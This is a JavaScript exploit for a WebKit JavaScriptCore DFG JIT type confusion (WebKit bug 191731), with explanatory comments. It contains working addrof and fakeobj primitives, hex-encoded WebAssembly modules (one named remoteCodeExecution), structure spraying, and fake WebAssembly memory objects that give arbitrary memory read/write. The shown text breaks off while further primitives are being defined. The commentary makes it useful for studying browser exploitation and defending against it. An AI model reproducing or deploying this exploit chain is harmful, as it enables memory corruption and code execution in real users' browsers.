/*
    الأفعال أبلغ من الأقوال
    "Actions speak louder than words"

    Alexandro Luongo (@w00dl3cs)
*/

//
// Exploit primitives
//
// Bug Tracker:     https://bugs.webkit.org/show_bug.cgi?id=191731
// WebKit Commit:   https://github.com/WebKit/webkit/commit/7cf9d2911af9f255e0301ea16604c9fa4af340e2
//
// "RegExp operations should not take fast path if lastIndex is not numeric"
//
// The DFG JIT does not take into account that regular expressions are not
// side-effects free. Installing an handler on the 'lastIndex' property,
// in fact, it's possible to run arbitrary javascript.
// As DFG does not bail-out, this might possibly lead to a type confusion.
//
var primitives = {
    //
    // addrof: leak the address of an arbitrary JavaScript object
    //
    // Allocate an unboxed array (ArrayWithDouble), then make it boxed (ArrayWithContiguous)
    // by inserting a JSObject through a side-effect call triggered inside a JIT-compiled function.
    // As the optimized routine still thinks the array contains unboxed values, it's
    // possible to retrieve the new inserted item with the engine treating it as double, while
    // instead it's a JSValue (pointer).
    //
    addrof: function(obj) {
        // Allocate an unboxed array (ArrayWithDouble)
        var arg = [1.1, 2.2, 3.3];

        var regexp = /a/y;

        function InfoLeaker(arg) {
            // Trigger the side-effect, invoking 'regexp.lastIndex.toString()'
            regexp[Symbol.match](obj === null);

            // 'arg[0]' is now a JSValue, but the routine is not aware of it
            return arg[0];
        }

        // Force JIT compilation of the InfoLeaker routine
        for (var i = 0; i < 100000; ++i)
            InfoLeaker(arg);

        // Installing an handler on 'valueOf' or 'toString'
        // allows executing arbitrary code without DFG bailing-out
        regexp.lastIndex = {
            valueOf: () => {
                // 'arg[0]' will be replaced with a pointer to 'obj'
                arg[0] = obj;
                return 0;
            }
        };

        var addr = InfoLeaker(arg);

        if (addr !== 1.1 && typeof addr !== 'object')
            return Int64.fromDouble(addr);

        throw "Could not leak address using 'addrof' primitive!"
    },

    //
    // fakeobj: inject arbitrary objects into the JavaScript engine
    //
    // Allocate an unboxed array (ArrayWithDouble), then make it boxed (ArrayWithContiguous)
    // by inserting a JSObject through a side-effect call triggered inside a JIT-compiled function.
    // As the optimized routine still thinks the array contains unboxed values, it's
    // possible to replace the new inserted item with a double, having the engine treat it
    // as a JSValue (pointer) instead.
    //
    fakeobj: function(addr) {
        // Allocate an unboxed array (ArrayWithDouble)
        var arg = [1.1, 2.2, 3.3];

        var regexp = /a/y;

        function ObjFaker(arg) {
            // Trigger the side-effect, invoking 'regexp.lastIndex.toString()'
            regexp[Symbol.match](addr === null);

            // 'arg' is now ArrayWithContiguous, but the routine is not aware of it
            arg[0] = addr;
        }

        // Force JIT compilation of the ObjFaker routine
        for (var i = 0; i < 100000; ++i)
            ObjFaker(arg);

        // Installing an handler on 'valueOf' or 'toString'
        // allows executing arbitrary code without DFG bailing-out
        regexp.lastIndex = {
            valueOf: () => {
                // 'arg[0]' will be replaced with a pointer
                arg[0] = {};
                return 0;
            }
        };

        ObjFaker(arg);

        var obj = arg[0];

        if (typeof obj === 'object')
            return obj;

        throw "Could not inject fake object using 'fakeobj' primitive!"
    }
};

//
// WebAssembly modules used for exploitation.
// Kudos to Linus Henze for his memory read/write module!
//
const webAssemblyModules = {
    arbitraryReadWrite: [
        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
        0x01, 0x0b, 0x02, 0x60, 0x01, 0x7f, 0x01, 0x7f,
        0x60, 0x02, 0x7f, 0x7f, 0x00, 0x02, 0x10, 0x01,
        0x07, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73,
        0x03, 0x6d, 0x65, 0x6d, 0x02, 0x00, 0x02, 0x03,
        0x07, 0x06, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01,
        0x07, 0x44, 0x06, 0x08, 0x72, 0x65, 0x61, 0x64,
        0x5f, 0x69, 0x33, 0x32, 0x00, 0x00, 0x09, 0x77,
        0x72, 0x69, 0x74, 0x65, 0x5f, 0x69, 0x33, 0x32,
        0x00, 0x01, 0x08, 0x72, 0x65, 0x61, 0x64, 0x5f,
        0x69, 0x31, 0x36, 0x00, 0x02, 0x09, 0x77, 0x72,
        0x69, 0x74, 0x65, 0x5f, 0x69, 0x31, 0x36, 0x00,
        0x03, 0x07, 0x72, 0x65, 0x61, 0x64, 0x5f, 0x69,
        0x38, 0x00, 0x04, 0x08, 0x77, 0x72, 0x69, 0x74,
        0x65, 0x5f, 0x69, 0x38, 0x00, 0x05, 0x0a, 0x46,
        0x06, 0x0b, 0x00, 0x20, 0x00, 0x41, 0x04, 0x6c,
        0x28, 0x02, 0x00, 0x0f, 0x0b, 0x0c, 0x00, 0x20,
        0x00, 0x41, 0x04, 0x6c, 0x20, 0x01, 0x36, 0x02,
        0x00, 0x0b, 0x0b, 0x00, 0x20, 0x00, 0x41, 0x02,
        0x6c, 0x2f, 0x01, 0x00, 0x0f, 0x0b, 0x0c, 0x00,
        0x20, 0x00, 0x41, 0x02, 0x6c, 0x20, 0x01, 0x3b,
        0x01, 0x00, 0x0b, 0x08, 0x00, 0x20, 0x00, 0x2d,
        0x00, 0x00, 0x0f, 0x0b, 0x09, 0x00, 0x20, 0x00,
        0x20, 0x01, 0x3a, 0x00, 0x00, 0x0b
    ],

    remoteCodeExecution: [
        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
        0x01, 0x04, 0x01, 0x60, 0x00, 0x00, 0x02, 0x1e,
        0x01, 0x07, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74,
        0x73, 0x12, 0x6c, 0x65, 0x61, 0x6b, 0x45, 0x78,
        0x65, 0x63, 0x75, 0x74, 0x61, 0x62, 0x6c, 0x65,
        0x50, 0x61, 0x67, 0x65, 0x00, 0x00, 0x03, 0x02,
        0x01, 0x00, 0x07, 0x0f, 0x01, 0x0b, 0x74, 0x72,
        0x69, 0x67, 0x67, 0x65, 0x72, 0x4c, 0x65, 0x61,
        0x6b, 0x00, 0x01, 0x0a, 0x06, 0x01, 0x04, 0x00,
        0x10, 0x00, 0x0b, 0x00, 0x38, 0x04, 0x6e, 0x61,
        0x6d, 0x65, 0x01, 0x2a, 0x02, 0x00, 0x1a, 0x69,
        0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0x2e, 0x6c,
        0x65, 0x61, 0x6b, 0x45, 0x78, 0x65, 0x63, 0x75,
        0x74, 0x61, 0x62, 0x6c, 0x65, 0x50, 0x61, 0x67,
        0x65, 0x01, 0x0b, 0x74, 0x72, 0x69, 0x67, 0x67,
        0x65, 0x72, 0x4c, 0x65, 0x61, 0x6b, 0x02, 0x05,
        0x02, 0x00, 0x00, 0x01, 0x00
    ]
};

var structs = [];

function sprayStructures() {
    for (var i = 0; i < 0x100; i++) {
        var a = new WebAssembly.Memory({ inital: 0x1 });
        a['prop' + i] = 1337;
        structs.push(a);
    }
}

function isMacOS(rwxPrologue) {
    //
    // 0x0000000000000000: push rbp
    // 0x0000000000000001: mov rbp, rsp
    //
    var macOSPrologue = [0x55, 0x48, 0x89, 0xe5];

    return (rwxPrologue.length >= macOSPrologue.length && macOSPrologue.every((op, i) => rwxPrologue[i] === op));
}

function loadWebAssemblyModule(webAssemblyCode) {
    return new WebAssembly.Module(new Uint8Array(webAssemblyCode));
}

//
// This routine returns an object capable to perform memory read/write
// operations through the use of a custom WebAssembly module built ad-hoc.
//
function getWebAssemblyMemoryAccess(webAssemblyModule, importObject) {
    var module = new WebAssembly.Instance(webAssemblyModule, importObject);

    return {
        read_i8: module.exports.read_i8,
        write_i8: module.exports.write_i8,

        read_i16: module.exports.read_i16,
        write_i16: module.exports.write_i16,

        read_i32: module.exports.read_i32,
        write_i32: module.exports.write_i32,

        read_i64: function(offset) {
            var result = Int64.Zero;
            for (var i = 0; i < 4; i++)
                result = Add(result, ShiftLeft(module.exports.read_i16((offset * 4) + i), i * 2));
            return result;
        },

        write_i64: function(offset, value) {
            for (var i = 0; i < 4; i++)
                module.exports.write_i16((offset * 4) + i, ShiftRight(value, i * 2).asInt16());
        }
    };
}

//
// The technique used to obtain arbitrary memory read/write primitives
// using WebAssembly has first been demonstrated by Linus Henze in Dec, 2018.
// The one presented in this writeup is my revisited version, hope he
// won't get mad at me for stealing his idea :P
//
function pwn() {
    //
    // Spray JSWebAssemblyMemory structures so that we'll be able to guess a
    // JSWebAssemblyMemory StructureID with very high probability later on.
    //
    sprayStructures();

    //
    // The WebAssembly modules used during exploitation have been crafted ad-hoc.
    // This one in particular exposes functions to read or write data to the
    // WebAssembly memory instance it's been connected to.
    //
    var arbitraryReadWriteWasmModule = loadWebAssemblyModule(webAssemblyModules.arbitraryReadWrite);

    //
    // During structure spraying, we've allocated 256 JSWebAssemblyMemory objects.
    // Let's use one of them for our arbitrary read/write primitives.
    // Killing two birds with one stone.
    //
    var realjsWasmMemory = structs[Math.floor(Math.random() * structs.length)];

    //
    // StructureIDs allocated during spraying should range between 380 and 570.
    // Any number in-between should provide us with a structure id we can use
    // to fake a valid Array. If that's not going to be the case, however,
    // we're gonna attempt to brute-force such identifier.
    // 512 (0x200) seems like a reasonable number to start from.
    //
    var jsCellHeader = new Int64([
        0x00, 0x02, 0x00, 0x00,          // m_structureID (0x00000200)
        0x0,                             // m_indexingTypeAndMisc (NoIndexingShape)
        0x15,                            // m_type (ObjectType)
        0x0,                             // m_flags
        0x1                              // m_cellState (DefinitelyWhite)
    ]);

    //
    // JavaScriptCore uses two different sets of objects when dealing with WebAssembly.
    // As we're interested in constructing arbitrary memory read/write primitives,
    // let's focus on the WebAssembly memory ones.
    //
    // In particular way, objects identifying WebAssembly memory having interactions
    // with the JavaScript code itself are represented as JSWebAssemblyMemory:
    //
    //  +0 < 48> JSWebAssemblyMemory
    //  +0 < 24>     JSC::JSDestructibleObject JSC::JSDestructibleObject
    //  +0 < 16>         JSC::JSNonFinalObject JSC::JSNonFinalObject
    //  +0 < 16>             JSC::JSObject JSC::JSObject
    //  +0 <  8>                 JSC::JSCell JSC::JSCell
    //  +0 <  1>                     JSC::HeapCell JSC::HeapCell
    //  +0 <  4>                   JSC::StructureID m_structureID
    //  +4 <  1>                   JSC::IndexingType m_indexingTypeAndMisc
    //  +5 <  1>                   JSC::JSType m_type
    //  +6 <  1>                   JSC::TypeInfo::InlineTypeFlags m_flags
    //  +7 <  1>                   JSC::CellState m_cellState
    //  +8 <  8>                 JSC::AuxiliaryBarrier<JSC::Butterfly *> m_butterfly
    //  +8 <  8>                   JSC::Butterfly * m_value
    // +16 <  8>         JSC::PoisonedClassInfoPtr m_classInfo
    // +16 <  8>           WTF::PoisonedBits m_poisonedBits
    // +24 <  8>     WTF::PoisonedRef<JSC::JSWebAssemblyMemoryPoison, Wasm::Memory> m_memory
    // +24 <  8>         WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::Wasm::Memory>::StorageType m_ptr
    // +24 <  8>           WTF::PoisonedBits m_poisonedBits
    // +32 <  8>     JSC::PoisonedWriteBarrier<JSC::JSWebAssemblyMemoryPoison, JSC::JSArrayBuffer> m_bufferWrapper
    // +32 <  8>         JSC::WriteBarrierBase<JSC::JSArrayBuffer, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::JSArrayBuffer> > JSC::WriteBarrierBase<JSC::JSArrayBuffer, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::JSArrayBuffer> >
    // +32 <  8>             JSC::WriteBarrierBase<JSC::JSArrayBuffer, WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::JSArrayBuffer> >::StorageType m_cell
    // +32 <  8>               WTF::PoisonedBits m_poisonedBits
    // +40 <  8>     WTF::PoisonedRefPtr<JSC::JSWebAssemblyMemoryPoison, JSC::ArrayBuffer> m_buffer
    // +40 <  8>         WTF::PoisonedPtrTraits<WTF::Poison<uintptr_t &>, JSC::ArrayBuffer>::StorageType m_ptr
    // +40 <  8>           WTF::PoisonedBits m_poisonedBits
    //
    // JSWebAssemblyMemory objects, in turn, keep a reference to the Wasm::Memory object
    // which contains the actual WebAssembly memory runtime data:
    //
    //  +0 < 88> Memory
    //  +0 <  8>     WTF::RefCounted<JSC::Wasm::Memory> WTF::RefCounted<JSC::Wasm::Memory>
    //  +0 <  8>         WTF::RefCountedBase WTF::RefCountedBase
    //  +0 <  4>           unsigned int m_refCount
    //  +4 <  1>           bool m_deletionHasBegun
    //  +5 <  1>           bool m_adoptionIsRequired
    //  +6 <  2>   <PADDING: 2 bytes>
    //  +8 <  8>   void * m_memory
    // +16 <  8>   size_t m_size
    // +24 <  4>     JSC::Wasm::PageCount m_initial
    // +24 <  4>       uint32_t m_pageCount
    // +28 <  4>     JSC::Wasm::PageCount m_maximum
    // +28 <  4>       uint32_t m_pageCount
    // +32 <  8>   size_t m_mappedCapacity
    // +40 <  1>   JSC::Wasm::MemoryMode m_mode
    // +41 <  7>   <PADDING: 7 bytes>
    // +48 <  8>     WTF::Function<void (JSC::Wasm::Memory::NotifyPressure)> m_notifyMemoryPressure
    // +48 <  8>         std::__1::unique_ptr<CallableWrapperBase, std::__1::default_delete<CallableWrapperBase> > m_callableWrapper
    // +48 <  8>             std::__1::__compressed_pair<CallableWrapperBase *, std::__1::default_delete<CallableWrapperBase> > __ptr_
    // +48 <  8>                 std::__1::__compressed_pair_elem<CallableWrapperBase *, 0, false> std::__1::__compressed_pair_elem<CallableWrapperBase *, 0, false>
    // +48 <  8>                   CallableWrapperBase * __value_
    // +48 <  1>                 std::__1::__compressed_pair_elem<std::__1::default_delete<CallableWrapperBase>, 1, true> std::__1::__compressed_pair_elem<std::__1::default_delete<CallableWrapperBase>, 1, true>
    // +48 <  1>                     std::__1::default_delete<CallableWrapperBase> std::__1::default_delete<CallableWrapperBase>
    // +56 <  8>     WTF::Function<void (JSC::Wasm::Memory::SyncTryToReclaim)> m_syncTryToReclaimMemory
    // +56 <  8>         std::__1::unique_ptr<CallableWrapperBase, std::__1::default_delete<CallableWrapperBase> > m_callableWrapper
    // +56 <  8>             std::__1::__compressed_pair<CallableWrapperBase *, std::__1::default_delete<CallableWrapperBase> > __ptr_
    // +56 <  8>                 std::__1::__compressed_pair_elem<CallableWrapperBase *, 0, false> std::__1::__compressed_pair_elem<CallableWrapperBase *, 0, false>
    // +56 <  8>                   CallableWrapperBase * __value_
    // +56 <  1>                 std::__1::__compressed_pair_elem<std::__1::default_delete<CallableWrapperBase>, 1, true> std::__1::__compressed_pair_elem<std::__1::default_delete<CallableWrapperBase>, 1, true>
    // +56 <  1>                     std::__1::default_delete<CallableWrapperBase> std::__1::default_delete<CallableWrapperBase>
    // +64 <  8>     WTF::Function<void (JSC::Wasm::Memory::GrowSuccess, JSC::Wasm::PageCount, JSC::Wasm::PageCount)> m_growSuccessCallback
    // +64 <  8>         std::__1::unique_ptr<CallableWrapperBase, std::__1::default_delete<CallableWrapperBase> > m_callableWrapper
    // +64 <  8>             std::__1::__compressed_pair<CallableWrapperBase *, std::__1::default_delete<CallableWrapperBase> > __ptr_
    // +64 <  8>                 std::__1::__compressed_pair_elem<CallableWrapperBase *, 0, false> std::__1::__compressed_pair_elem<CallableWrapperBase *, 0, false>
    // +64 <  8>                   CallableWrapperBase * __value_
    // +64 <  1>                 std::__1::__compressed_pair_elem<std::__1::default_delete<CallableWrapperBase>, 1, true> std::__1::__compressed_pair_elem<std::__1::default_delete<CallableWrapperBase>, 1, true>
    // +64 <  1>                     std::__1::default_delete<CallableWrapperBase> std::__1::default_delete<CallableWrapperBase>
    // +72 < 16>     WTF::Vector<WTF::WeakPtr<JSC::Wasm::Instance>, 0, WTF::CrashOnOverflow, 16> m_instances
    // +72 < 16>         WTF::VectorBuffer<WTF::WeakPtr<JSC::Wasm::Instance>, 0> WTF::VectorBuffer<WTF::WeakPtr<JSC::Wasm::Instance>, 0>
    // +72 < 16>             WTF::VectorBufferBase<WTF::WeakPtr<JSC::Wasm::Instance> > WTF::VectorBufferBase<WTF::WeakPtr<JSC::Wasm::Instance> >
    // +72 <  8>               WTF::WeakPtr<JSC::Wasm::Instance> * m_buffer
    // +80 <  4>               unsigned int m_capacity
    // +84 <  4>               unsigned int m_size
    //
    // This is true for pretty much every WebAssembly object exposed to the JavaScript interface.
    // As a result, faking WebAssembly objects to the engine requires double the efforts.
    //

    //
    // Let's create the container objects whose inline properties
    // will be used to fake objects to the JavaScript engine.
    //
    // The idea is to fake a JSWebAssemblyMemory, and then redirect
    // its 'm_memory' field to a fake Wasm::Memory instance, so that
    // we can control what memory location it is pointing to.
    //

    var jsWasmMemoryContainer = {
        jsCellHeader: jsCellHeader.asJSValue(),
        butterfly: null,
        classInfo: null,
        memory: null,
        bufferWrapper: null,
        buffer: null
    };

    //
    // Deleting a property of an object basically sets
    // all its bits to zero, making it a valid JSValue.
    //
    delete jsWasmMemoryContainer.butterfly;
    delete jsWasmMemoryContainer.classInfo;
    delete jsWasmMemoryContainer.bufferWrapper;
    delete jsWasmMemoryContainer.buffer;

    var wasmMemoryContainer = {
        refCount: null,
        memory: null,
        size: Int64.Max.asJSValue(),
        pages: Int64.Max.asJSValue(),
        capacity: Int64.Max.asJSValue(),
        mode: null,
        notifyMemoryPressure: null,
        syncTryToReclaimMemory: null,
        growSuccessCallback: null,
        instances: null,
    };

    delete wasmMemoryContainer.mode;
    delete wasmMemoryContainer.notifyMemoryPressure;
    delete wasmMemoryContainer.syncTryToReclaimMemory;
    delete wasmMemoryContainer.growSuccessCallback;
    delete wasmMemoryContainer.instances;

    //
    // Let's have a look at how 'jsWasmMemoryContainer' appears in memory.
    //
    // lldb output (with 'jsWasmMemoryContainer' at 0x107ab3e80):
    //
    // (lldb) x/8gx 0x107ab3e80 -l 1
    // 0x107ab3e80: 0x0100160000001180  +---------------+
    // 0x107ab3e88: 0x0000000000000000  +-------------+ |
    // 0x107ab3e90: 0x0100150000001000  +-----------+ | |
    // 0x107ab3e98: 0x0000000000000000  +---------+ | | |
    // 0x107ab3ea0: 0x0000000000000000  +-------+ | | | |
    // 0x107ab3ea8: 0x0000000000000002  +-----+ | | | | |
    // 0x107ab3eb0: 0x0000000000000000  +---+ | | | | | |
    // 0x107ab3eb8: 0x0000000000000000  +-+ | | | | | | |
    //                                    | | | | | | | |
    // +-------------------------------+  | | | | | | | |
    // |    jsWasmMemoryContainer      |  | | | | | | | |
    // +-------------------------------+  | | | | | | | |
    // | +0 <8> JSC::JSCell            <----------------+
    // | +8 <8> JSC::Butterfly         <--------------+
    // |                               |  | | | | | |
    // | Inline properties:            |  | | | | | |
    // |                               |  | | | | | |
    // | +16 <8> jsCellHeader          <------------+
    // | +24 <8> butterfly             <----------+
    // | +32 <8> classInfo             <--------+
    // | +40 <8> memory                <------+
    // | +48 <8> bufferWrapper         <----+
    // | +56 <8> buffer                <--+
    // +-------------------------------+
    //

    var jsWasmMemoryContainerAddr = primitives.addrof(jsWasmMemoryContainer);
    print("[+] JSWebAssemblyMemory Container @ " + jsWasmMemoryContainerAddr);

    //
    // Pointing a JSValue to the inline properties of the 'jsWasmMemoryContainer'
    // object, we can inject a valid JSObject inside the JavaScript engine.
    //
    // +-------------------------------+
    // |     jsWasmMemoryContainer     |
    // +-------------------------------+
    // | +0 <8> JSC::JSCell            |
    // | +8 <8> JSC::Butterfly         |
    // |                               |
    // | Inline properties:            |
    // |                               |      +-------------------------+
    // | +16 <8> jsCellHeader  <--------------+ jsWasmMemory (JSObject) |
    // | +24 <8> butterfly             |      +-------------------------+
    // | +32 <8> classInfo             |
    // | +40 <8> memory                |
    // | +48 <8> bufferWrapper         |
    // | +56 <8> buffer                |
    // +-------------------------------+
    //

    var jsWasmMemoryAddr = Add(jsWasmMemoryContainerAddr, 16);
    print("[+] Fake JSWebAssemblyMemory @ " + jsWasmMemoryAddr);

    var jsWasmMemory = primitives.fakeobj(jsWasmMemoryAddr.asDouble());

    //
    // From now on, garbage collector would be super unhappy, and would
    // make everything crash in case it got triggered during exploitation.
    // We'll repair everything as fast as possible, and with a minimal
    // amount of memory allocations.
    //

    //
    // As pointed out before, using 512 as StructureID should be a safe bet
    // to fake a JSWebAssemblyMemory object... but better safe, than sorry.
    //
    while (!(jsWasmMemory instanceof WebAssembly.Memory)) {
        jsCellHeader.assignAdd(jsCellHeader, Int64.One);
        jsWasmMemoryContainer.jsCellHeader = jsCellHeader.asJSValue();
    }

    //
    // Let's now have a look at how 'wasmMemoryContainer' appears in memory.
    //
    // lldb output (with 'wasmMemoryContainer' at 0x1093e0000):
    //
    // (lldb) x/12gx 0x1093e0000 -l 1
    // 0x1093e0000: 0x010016000000118b  +------------------------+
    // 0x1093e0008: 0x0000000000000000  +----------------------+ |
    // 0x1093e0010: 0x0100150000001000  +--------------------+ | |
    // 0x1093e0018: 0x0000000000000002  +------------------+ | | |
    // 0x1093e0020: 0x0fffffffffffffff  +----------------+ | | | |
    // 0x1093e0028: 0x0fffffffffffffff  +--------------+ | | | | |
    // 0x1093e0030: 0x0fffffffffffffff  +------------+ | | | | | |
    // 0x1093e0038: 0x0000000000000000  +----------+ | | | | | | |
    // 0x1093e0040: 0x0000000000000000  +--------+ | | | | | | | |
    // 0x1093e0048: 0x0000000000000000  +------+ | | | | | | | | |
    // 0x1093e0050: 0x0000000000000000  +----+ | | | | | | | | | |
    // 0x1093e0058: 0x0000000000000000  +--+ | | | | | | | | | | |
    //                                     | | | | | | | | | | | |
    // +--------------------------------+  | | | | | | | | | | | |
    // |      wasmMemoryContainer       |  | | | | | | | | | | | |
    // +--------------------------------+  | | | | | | | | | | | |
    // | +0 <8> JSC::JSCell             <------------------------+
    // | +8 <8> JSC::Butterfly          <----------------------+
    // |                                |  | | | | | | | | | |
    // | Inline properties:             |  | | | | | | | | | |
    // |                                |  | | | | | | | | | |
    // | +16 <8> refCount               <--------------------+
    // | +24 <8> memory                 <------------------+
    // | +32 <8> size                   <----------------+
    // | +40 <8> pages                  <--------------+
    // | +48 <8> capacity               <------------+
    // | +56 <8> mode                   <----------+
    // | +64 <8> notifyMemoryPressure   <--------+
    // | +72 <8> syncTryToReclaimMemory <------+
    // | +80 <8> growSuccessCallback    <----+
    // | +88 <8> instances              <--+
    // +--------------------------------+
    //

    var wasmMemoryContainerAddr = primitives.addrof(wasmMemoryContainer);
    print("[+] Wasm Memory Container @ " + wasmMemoryContainerAddr);

    //
    // The inline properties of the 'wasmMemoryContainer' object can be
    // used to represent a valid Wasm::Memory object.
    // Unfortunately, such object does not inherit from JSCell, so it's
    // not possible to obtain a valid JSValue pointing to it.
    //
    // In other words, as our 'fakeobj' routine is expected to return
    // a JSObject, it means it's not going to work if we want to inject
    // a Wasm::Memory object into the engine.
    //
    // On the other hand, giving the inline properties a valid JSCell
    // header is still a feasible approach at bypassing this limitation.
    //

    wasmMemoryContainer.refCount = jsCellHeader.asJSValue();

    //
    // Similarly to what's been done with the 'jsWasmMemory' object,
    // we can now inject another JSObject inside the engine by pointing
    // a JSValue to the inline properties of the 'wasmMemoryContainer'
    // object.
    //
    // +--------------------------------+
    // |      wasmMemoryContainer       |
    // +--------------------------------+
    // | +0 <8> JSC::JSCell             |
    // | +8 <8> JSC::Butterfly          |
    // |                                |
    // | Inline properties:             |
    // |                                |     +-----------------------+
    // | +16 <8> refCount  <------------------+ wasmMemory (JSObject) |
    // | +24 <8> memory                 |     +-----------------------+
    // | +32 <8> size                   |
    // | +40 <8> pages                  |
    // | +48 <8> capacity               |
    // | +56 <8> mode                   |
    // | +64 <8> notifyMemoryPressure   |
    // | +72 <8> syncTryToReclaimMemory |
    // | +80 <8> growSuccessCallback    |
    // | +88 <8> instances              |
    // +--------------------------------+
    //

    var wasmMemoryAddr = Add(wasmMemoryContainerAddr, 16);
    print("[+] Fake Wasm Memory @ " + wasmMemoryAddr);

    var wasmMemory = primitives.fakeobj(wasmMemoryAddr.asDouble());

    //
    // Finally, reverting the changes done to the 'refCount' field
    // of the 'wasmMemoryContainer' object, 'wasmMemory' becomes
    // at all effects a Wasm::Memory object.
    //

    wasmMemoryContainer.refCount = Int64.One.asDouble();

    //
    // Now that we have successfully injected a JSWebAssemblyMemory and
    // a Wasm::Memory object into the engine, one can be connected to
    // the other.
    //
    // +------------------------------------+
    // |            jsWasmMemory            |            +-----------------------------+
    // +------------------------------------+            |         wasmMemory          |
    // | +0  <8> JSC::JSCell                |            +-----------------------------+
    // | +8  <8> JSC::Butterfly             |     +------> +0  <8> WTF::RefCountedBase |
    // | +16 <8> JSC::PoisonedClassInfoPtr  |     |      | +8  <8> void* memory        |
    // | +24 <8> Wasm::Memory          -----------+      | +16 <8> size_t              |
    // | +32 <8> JSC::JSArrayBuffer         |            | ...                         |
    // | +40 <8> JSC::ArrayBuffer           |            +-----------------------------+
    // +------------------------------------+
    //

    jsWasmMemoryContainer.memory = wasmMemory;

    //
    // This object is going to be used from any WebAssembly instance
    // created from 'arbitraryReadWriteWasmModule': its properties are
    // going to be imported, and as such will be available to the
    // WebAssembly module itself.
    //
    var arbitraryReadWriteImportObject = {
        imports: {
            mem: jsWasmMemory
        }
    };

    //
    // This routine is intended as a reliable way to obtain read/write access
    // to a memory location through the use of a WebAssembly module instance
    // with its backing memory pointing to that particular location.
    // Input parameter can either be a JSValue, or an address.
    //
    // When a JSValue is provided, it's used to set the 'memory' property of the
    // 'wasmMemory' object: in this way, when a new instance of the WebAssembly
    // module is created, it's going to use 'arbitraryReadWriteImportObject.imports.mem'
    // as backing memory.
    //
    // When an address is provided, instead...
    //
    function getMemoryAccessTo(entry) {
        if (entry instanceof Int64)
            wasmMemoryAccess.write_i64(1, entry);
        else
            wasmMemoryContainer.memory = entry;

        return getWebAssemblyMemoryAccess(arbitraryReadWriteWasmModule, arbitraryReadWriteImportObject);
    }

    //
    // ... we're going to use an existing WebAssembly instance object with its
    // backing memory pointing to a JSValue, and modify it so that it will be able
    // to point to any arbitrary location inside the process address space.
    //
    var wasmMemoryAccess = getMemoryAccessTo(wasmMemory);

    //
    // Arbitrary memory read/write has been achieved, but most of
    // the objects used so far have been corrupted, thus garbage
    // collector would still crash the process if triggered.
    //
    // To solve this issue, we attempt to replace the corrupted
    // objects with valid ones.
    //

    //
    // First of all, we use the new acquired capabilities to get access to
    // a real JSWebAssemblyMemory instance, so that we can leak the address
    // of the Wasm::Memory instance it's backed from.
    //

    var realjsWasmMemoryAccess = getMemoryAccessTo(realjsWasmMemory);
    var realWasmMemoryAddr = realjsWasmMemoryAccess.read_i64(3); // m_memory
    print("[+] Real Wasm Memory @ " + realWasmMemoryAddr);

    //
    // Once we have leaked the address of an authentic Wasm::Memory object,
    // we're going to use it to create a brand new instance of our read/write
    // WebAssembly module, and replace the old one created from a corrupted object.
    //

    wasmMemoryAccess = getMemoryAccessTo(realWasmMemoryAddr);

    //
    // Finally, as the authentic Wasm::Memory object has access to a very
    // limited memory region, we're going to increase its 'm_size', 'm_initial' and
    // 'm_maximum' fields, so that it will be able to point to arbitrary locations.
    //

    wasmMemoryAccess.write_i64(2, Int64.Max); // m_size
    wasmMemoryAccess.write_i64(3, Int64.Max); // m_initial, m_maximum (int32_t)

    //
    // This object will come in handy the moment we're going to
    // upgrade the 'addrof' and 'fakeobj' primitives: its inline
    // property is a JSValue, so we're going to use it as an helper
    // to leak addresses and inject objects into the engine.
    //
    var leaker = {
        helper: null
    };

    //
    // Upgraded 'addrof' and 'fakeobj' primitives will make use of
    // this WebAssembly module instance to read or write to the
    // 'helper' property of the 'leaker' object.
    //
    var leakerMemoryAccess = getMemoryAccessTo(leaker);

    //
    // Swapping our fake JSWebAssemblyMemory instance with the real one
    // we've allocated during spraying allows the garbage collector
    // to get rid of the corrupted object without crashing the process.
    //
    arbitraryReadWriteImportObject.imports.mem = realjsWasmMemory;

    //
    // Time to upgrade exploit primitives!
    //
    primitives = {
        addrof: function(obj) {
            leaker.helper = obj;
            return leakerMemoryAccess.read_i64(2);
        },

        fakeobj: function(addr) {
            leakerMemoryAccess.write_i64(2, addr);
            return leaker.helper;
        }
    };

    //
    // We'll get this opportunity to upgrade the 'getMemoryAccessTo'
    // routine as well, so that it does not rely on modifying the
    // properties of the 'wasmMemoryContainer' object... as that's
    // corrupted, and we need to get rid of it as soon as possible.
    //
    getMemoryAccessTo = function(entry) {
        if (!(entry instanceof Int64))
            entry = primitives.addrof(entry);

        wasmMemoryAccess.write_i64(1, entry);

        return getWebAssemblyMemoryAccess(arbitraryReadWriteWasmModule, arbitraryReadWriteImportObject);
    };

    print("[+] Cleaning up...");

    //
    // Finally, it's time to fix the JSCell of the containers we
    // used to inject our corrupted objects into the engine.
    // Doing so, the garbage collector won't know about their properties
    // anymore, thus won't try to mark them (causing the process to crash).
    //
    // To accomplish that, we're first going to leak the cell header of a valid
    // empty object, and then use to fix the containers.
    //
    var emptyObject = {};
    var emptyObjectMemoryAccess = getMemoryAccessTo(emptyObject);
    var jsEmptyCellHeader = emptyObjectMemoryAccess.read_i64(0);

    var jsWasmMemoryContainerMemoryAccess = getMemoryAccessTo(jsWasmMemoryContainer);
    jsWasmMemoryContainerMemoryAccess.write_i64(0, jsEmptyCellHeader);

    var wasmMemoryContainerMemoryAccess = getMemoryAccessTo(wasmMemoryContainer);
    wasmMemoryContainerMemoryAccess.write_i64(0, jsEmptyCellHeader);

    //
    // Are you ready for this? ... Trigger the garbage collector!
    //
    if (typeof(gc) !== 'undefined')
        gc();

    //
    // Time to upgrade exploit primitives (again)!
    //
    primitives = {
        ...primitives,

        read: function(target, addr) {
            var memoryAccess = getMemoryAccessTo(addr);
            return memoryAccess["read_i" + target](0);
        },

        write: function(target, addr, what) {
            var memoryAccess = getMemoryAccessTo(addr);
            memoryAccess["write_i" + target](0, what);
        },

        read8:   function(addr)        { return this.read(8, addr); },
        write8:  function(what, addr)  { this.write(8, addr, what); },

        read16:  function(addr)        { return this.read(16, addr); },
